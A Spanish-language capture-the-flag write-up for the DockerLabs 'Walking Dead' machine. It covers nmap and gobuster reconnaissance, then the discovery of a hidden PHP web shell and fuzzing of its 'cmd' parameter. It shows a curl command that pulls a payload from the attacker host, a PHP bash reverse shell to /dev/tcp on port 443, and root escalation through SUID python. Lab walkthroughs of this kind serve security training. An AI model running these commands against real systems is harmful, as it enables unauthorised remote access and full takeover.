#MAQUINA #DOCKERLABS #FACIL 
#RCE 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Walking Dead** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 10:16 CET
Initiating ARP Ping Scan at 10:16
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 10:16, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:16
Scanning 172.17.0.2 [65535 ports]
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 10:16, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-15 10:16:24 CET for 1s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.72 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** y el puerto **22(SSH)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80 172.17.0.2                      
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 10:16 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.000019s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0d:09:9d:0f:dc:43:54:cd:39:a9:e2:d6:81:74:40:e8 (RSA)
|   256 09:d0:f6:52:00:3f:21:51:19:b1:c6:7a:f4:ff:21:01 (ECDSA)
|_  256 19:e0:b3:72:bd:e9:1e:8d:4c:c4:fd:1f:da:3f:a5:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: The Walking Dead - CTF
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.51 seconds

```

   ```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-15 10:17 CET
Nmap scan report for gatekeeperhr.com (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-enum: 
|_  /hidden/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds



```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

Vemos un directorio **hidden** que puede ser interesante.

## HTTP (80)
Al revisar la web que hay en el puerto 80 utilizando **gobuster**:

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x html,php,js,txt,png,jpg    
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,js,txt,png,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/index.html           (Status: 200) [Size: 1380]
/backup.txt           (Status: 200) [Size: 53]
/hidden               (Status: 301) [Size: 309] [--> http://172.17.0.2/hidden/]
/.html                (Status: 403) [Size: 275]
/.php                 (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/logitech-quickcam_W0QQcatrefZC5QQfbdZ1QQfclZ3QQfposZ95112QQfromZR14QQfrppZ50QQfsclZ1QQfsooZ1QQfsopZ1QQfssZ0QQfstypeZ1QQftrtZ1QQftrvZ1QQftsZ2QQnojsprZyQQpfidZ0QQsaatcZ1QQsacatZQ2d1QQsacqyopZgeQQsacurZ0QQsadisZ200QQsaslopZ1QQsofocusZbsQQsorefinesearchZ1.html (Status: 403) [Size: 275]
Progress: 8916824 / 8916831 (100.00%)
===============================================================
Finished
===============================================================

```

En el **backup.txt** no hay nada interesante y al usar gobuster en **hidden** no encontramos nada.

Sin embargo, al hacer ctrl + u en el **index.html**, vamos lo siguiente:

```html
<p class="hidden-link"><a href="[hidden/.shell.php](view-source:http://172.17.0.2/hidden/.shell.php)">Access Panel</a></p> </body> </html>
```

# EXPLOTACION

Vamos a utilizar **wfuzz** para intentar ver el parámetro de esa shell:

   ```bash

fuzz -u "http://172.17.0.2/hidden/.shell.php?FUZZ=ls /etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  --hl=0
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://172.17.0.2/hidden/.shell.php?FUZZ=ls%20/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000004986:   200        1 L      1 W        11 Ch       "cmd"


```

Vemos la ruta y subimos una reverse shell:

```bash
cmd=curl 172.17.0.1:8000/wp.php -o /var/www/html/wp.php
```

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

YA ESTAMOS COMO WWW-DATA.

# ESCALADA PRIVILEGIOS

Vemos si hay archivos con permisos SUID:

   ```bash
www-data@2ed43105b7bb:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/man
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/python3.8
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

Vemos **python** con permisos SUID :
   ```bash
www-data@2ed43105b7bb:/var/www/html$ /usr/bin/python3.8 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# whoami
root
# 
```

**YA ESTAMOS COMO ROOT.**